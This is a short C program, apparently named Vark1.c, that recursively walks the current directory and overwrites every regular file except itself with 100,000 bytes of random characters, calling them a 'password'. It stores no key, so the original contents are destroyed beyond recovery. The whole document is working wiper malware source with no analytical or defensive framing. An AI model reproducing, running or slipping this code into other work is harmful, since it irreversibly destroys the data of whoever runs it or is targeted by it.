#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define passwordLength 100000

char generateRandomChar() {
    const char characters[] = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*(){}[]-=_+|;:',./<>?`~";
    return characters[rand() % (sizeof(characters) - 1)];
}

void generatePassword(char *password, int length) {
    for (int i = 0; i < length; ++i) {
        password[i] = generateRandomChar();
    }
    password[length] = '\0';
}

void processFolder(const char *folderPath) {
    DIR *directory = opendir(folderPath);
    if (directory == NULL) {
        perror("Unable to open directory");
        exit(EXIT_FAILURE);
    }

    struct dirent *entry;
    while ((entry = readdir(directory)) != NULL) {
        if (entry->d_type == DT_REG && strcmp(entry->d_name, "Vark1.c") != 0) {
            char filePath[257];
            snprintf(filePath, 257, "%s/%s", folderPath, entry->d_name);

            FILE *file = fopen(filePath, "r+");
            if (file == NULL) {
                perror("Unable to open file");
                continue;
            }

            char password[passwordLength + 1];
            generatePassword(password, passwordLength);

            fseek(file, 0, SEEK_END);
            long fileSize = ftell(file);
            fseek(file, 0, SEEK_SET);

            const char *newContent = password;
            size_t bytesWritten = fwrite(newContent, 1, strlen(newContent), file);
            if (bytesWritten != strlen(newContent)) {
                perror("Unable to write to file");
                fclose(file);
                continue;
            }

            for (long i = strlen(newContent); i < passwordLength; ++i) {
                fputc('\0', file);
            }

            fclose(file);
        }
        else if (entry->d_type == DT_DIR && strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
            char subfolderPath[257];
            snprintf(subfolderPath, 257, "%s/%s", folderPath, entry->d_name);
            processFolder(subfolderPath);
        }
    }

    closedir(directory);
}

int main() {
    srand((unsigned int)time(NULL));

    processFolder(".");

    return 0;
}
